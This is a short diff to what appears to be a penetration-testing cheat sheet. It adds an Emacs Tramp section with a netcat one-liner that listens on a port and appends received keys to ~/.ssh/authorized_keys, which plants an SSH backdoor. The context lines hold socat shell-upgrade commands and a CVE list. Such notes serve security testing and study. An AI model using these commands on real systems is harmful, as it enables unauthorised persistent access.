@@ -73,6 +73,11 @@ socat file:`tty`,raw,echo=0 TCP-L:4445
 export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
 
+### Tramp (Emacs)
+```
+ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; }
+```
+
 ## CVEs
 - CVE : 2014-6287 ([39161](cve/cve-2014-6287-39161.md))
 - CVE : 2014-6287 ([49125](cve/cve-2014-6287-49125.md))
